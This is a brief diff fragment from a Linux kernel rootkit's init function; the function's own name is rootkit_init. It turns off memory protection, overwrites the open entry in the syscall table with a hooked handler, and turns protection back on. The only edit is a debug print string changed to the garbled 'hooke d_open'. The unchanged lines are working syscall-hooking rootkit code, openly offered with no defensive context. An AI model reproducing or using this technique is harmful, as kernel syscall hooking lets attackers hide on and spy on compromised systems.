@@ -119,7 +119,7 @@ static int __init rootkit_init(void)
         unprotect_memory();
         sys_call_table[__NR_open] = (unsigned long)hooked_open;
         protect_memory();
-        pr_info("hooked_open: %x\n", sys_call_table[__NR_open]);
+        pr_info("hooke d_open: %x\n", sys_call_table[__NR_open]);
     }
     else{
         pr_info("Damm, I can't find syscall table!\n");
